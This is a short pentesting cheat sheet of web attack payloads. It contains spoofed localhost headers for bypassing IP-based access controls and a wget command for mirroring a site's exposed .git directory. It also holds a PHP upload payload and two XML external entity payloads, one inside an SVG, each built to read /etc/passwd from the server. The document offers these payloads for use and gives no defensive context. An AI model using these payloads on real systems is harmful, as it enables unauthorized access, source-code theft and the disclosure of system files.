/// with headers // localhost, 127.0.0.1, 127.1
X-Custom-IP-Authorization: 127.0.0.1
X-Custom-IP-Authorization: 127.1
X-Custom-IP-Authorization: localhost
Host: 127.0.0.1
Host: 127.1
Host: localhost
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Host: 127.1
X-Forwarded-Host: localhost
X-Forwarded-Scheme: 127.0.0.1
X-Forwarded-Scheme: 127.1
X-Forwarded-Scheme: localhost
X-Forwarded-For: 127.0.0.1

X-Forwarded-For: 127.1
X-Forwarded-For: localhost
X-Host: 127.0.0.1
X-Host: 127.1
X-Host: localhost


/// NULLbytes



/// Download git and use apt-get install git-cola
wget -r wedsite.com/.git


/// file upload
=====
with exploit.php
<?php echo file_get_contents('/etc/passwd'); ?> 

=====
xml.svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY fetch SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size=“23" x=“8" y=“28">&fetch;</text>
</svg>

=====
simple xml xxe
<!DOCTYPE hack [ <!ENTITY fetch SYSTEM "file:///etc/passwd">]>
&fetch;

